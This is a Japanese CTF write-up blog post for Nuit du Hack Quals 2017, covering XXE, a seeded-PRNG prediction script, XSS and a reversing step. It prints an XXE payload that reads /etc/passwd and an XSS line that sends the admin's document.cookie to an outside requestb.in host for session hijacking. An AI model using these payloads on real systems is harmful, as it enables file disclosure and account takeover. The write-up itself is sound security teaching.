---
layout: post
title: Nuit du Hack CTF Quals 2017 の write-up
categories: [ctf]
date: 2017-04-03 14:30:01 +0900
---

チーム Harekaze で [Nuit du Hack CTF Quals 2017](https://quals.nuitduhack.com/) に参加しました。最終的にチームで 410 点を獲得し、順位は 115 位 (得点 378 チーム中) でした。うち、私は 4 問を解いて 410 点を入れました。

以下、解いた問題の write-up です。

## [Web 75] No Pain No Gain

与えられた URL を開いてみると、CSV を HTML に変換できるサービスが動いていました。

```
<!-- Invitations -->
id,name,email
1,name1,email1@mail.com
2,name2,email2@mail.com
```

というような CSV をアップロードしろということなので、試しにこの内容でアップロードしてみると… `Sorry! File type not allowed.` とエラーが出力されました。

Fiddler を使ってアップロード時に `Content-Type: application/octet-stream` から `Content-Type: text/csv` に変えてみると

|ID|Name|Email|
|---|---|---|
|1|name1|email1@example.com|
|2|name2|email2@example.com|

というようなテーブルが出力されました。

`<!--` という内容のファイルを送ってみると、`Could not convert the CSV to XML!` とエラーが出力されました。XML といえば XXE です。試しに

```xml
<!DOCTYPE hoge [ <!ENTITY xxe SYSTEM "/etc/passwd"> ]>
id,name,email
a,b,&xxe;
```

を送ってみると

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
flag:x:1000:1000::/home/flag:/bin/sh
```

が返ってきました。読むファイルを `/home/flag/flag` に変えてアップロードするとフラグが出力されました。

```
NDH{U3VwZXIgTWFyaW8gQnJvcw0K44K544O844OR44O844Oe44Oq44Kq44OW44Op44K244O844K6DQpTxatwxIEgTWFyaW8gQnVyYXrEgXp1DQrYs9mI2KjYsdmF2KfYsdmK2Yg=}
```

## [Web 100] Slumdog Millionaire

```python
#!/usr/bin/python2.7

import random

import config
import utils


random.seed(utils.get_pid())
ngames = 0


def generate_combination():
    numbers = ""
    for _ in range(10):
        rand_num = random.randint(0, 99)
        if rand_num < 10:
            numbers += "0"
        numbers += str(rand_num)
        if _ != 9:
            numbers += "-"
    return numbers


def reset_jackpot():
    random.seed(utils.get_pid())
    utils.set_jackpot(0)
    ngames = 0


def draw(user_guess):
    ngames += 1
    if ngames > config.MAX_TRIES:
        reset_jackpot()
    winning_combination = generate_combination()
    if winning_combination == user_guess:
        utils.win()
        reset_jackpot()
```

というソース付きの問題でした。

PID を乱数のシードにしており、しかもこれまでにどんな組み合わせが出たかを教えてくれるので簡単に推測ができそうです。

```python
import random

def generate_combination():
  numbers = ""
  for _ in range(10):
    rand_num = random.randint(0, 99)
    if rand_num < 10:
      numbers += "0"
    numbers += str(rand_num)
    if _ != 9:
      numbers += "-"
  return numbers

if __name__ == '__main__':
  import sys
  for x in range(32768):
    random.seed(x)
    for _ in range(10):
      if sys.argv[1] == generate_combination():
        print x
        for _ in range(10):
          print generate_combination()
        break
```

`python s.py 07-94-30-38-33-33-41-95-56-00` といった感じで実行すると次の組み合わせが分かります。

```
God_does_not_pl4y_dic3
```

## [Web 200] Purple Posse Market

与えられた URL を開くとヤバそうなものが売られているショッピングサイトが表示されました。

管理者にメッセージを送ることができるようので試しに `<img src=http://requestb.in/xxxxxxx>` を送ってみると、`Referer: http://localhost:3001/admin/messages/xxx/` でアクセスが来ました。

`<script>(new Image).src='http://requestb.in/xxxxxxx?'+document.cookie;</script>` を送ってみると、`connect.sid=xxx` というような形で管理者の Cookie を得ることができました。

この Cookie を使うとメニューに Profile が増えました。Profile に書かれている IBAN コードがフラグでした。

```
IBAN FR14 2004 1010 0505 0001 3M02 606
```

## [Reverse 35] Matriochka step 1

```
$ file step1.bin
step1.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, not stripped
```

というバイナリが与えられました。試しに `ltrace ./step1.bin ABCD` を実行してみると

```
$ ltrace ./step1.bin ABCD
__libc_start_main(0x400666, 2, 0x7ffff7b65628, 0x400820 <unfinished ...>
strlen("ABCD")                                                            = 4
strcmp("DCBA", "Tr4laLa!!!")                                              = -16
puts("Try again :("Try again :(
)                                                      = 13
+++ exited (status 0) +++
```

と出力されました。逆さまにした argv[1] と `Tr4laLa!!!` を比較しているようなので `./step1.bin '!!!aLal4rT'` を実行すると

```
$ ./step1.bin '!!!aLal4rT' 2>/dev/null
Well done :)
```

という感じで標準出力には `Well done :)` が、標準エラー出力には step2 の実行ファイルが出力されました。

```
!!!aLal4rT
```
